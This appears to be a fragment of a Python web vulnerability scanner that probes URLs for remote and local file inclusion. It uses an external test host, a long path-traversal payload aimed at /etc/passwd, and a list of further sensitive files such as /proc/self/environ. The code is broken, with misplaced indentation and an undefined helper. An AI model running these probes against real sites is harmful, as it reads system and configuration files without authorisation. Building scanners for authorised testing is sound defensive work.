THE_ADDR = 'http://wvstest.weebly.com'
THE_TEXT = 'this is special text to test the rfi vulnerability!!!'
LFI_STRING = '../../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
#liad note: url should be like : http://abcs.com/somepage.php?page=
def checkRFI(url):
	"""
	check if rfi exist in the givven url
	"""
	ans = requests.get(url+THE_ADDR)
	if THE_TEXT in ans.text:
		return url

	def checkLFI(url):
	"""
	check if rfi exist in the givven url
	more : 
	/etc/group
	/etc/hosts
	/etc/motd
	/etc/issue
	/etc/mysql/my.cnf
	/proc/self/environ
	/proc/version
	/proc/cmdline
	test null %00 later
	"""
	ans = requests.get(url+LFI_STRING) #liad note: find the linux/unix based servers
	if not notFound(ans.text):
		return url